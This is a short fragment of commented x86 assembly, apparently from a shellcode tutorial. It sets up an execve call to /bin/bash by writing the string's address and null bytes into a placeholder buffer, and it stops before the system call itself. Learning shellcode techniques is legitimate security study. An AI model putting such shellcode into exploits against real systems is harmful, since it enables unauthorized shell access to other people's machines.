; execve
; execve takes 3 arguments
; 1: filename: EX /bin/bash, 0x0
; 2: arguments for the executable(1st arg should be the filename then 2nd arg should be null or 0x0000)
; 3: envp is used for env settings, we can leave this as null: EX 0x0000

	mov dword [esi +10], esi ; we are now wanting to change BBBB to be the address of the string /bin/bash
	; sincethe first B is right after the A at position 9 we now use 10
	
	mov dword [esi +14], ebx ; we need all C's to be null. Since we xor'd ebx already we can use that
	; we move this to 14 bytes now since there were 4 B's
	
	lea ebx, [esi] ; this will load the address of /bin/bash into ebx as the first arg
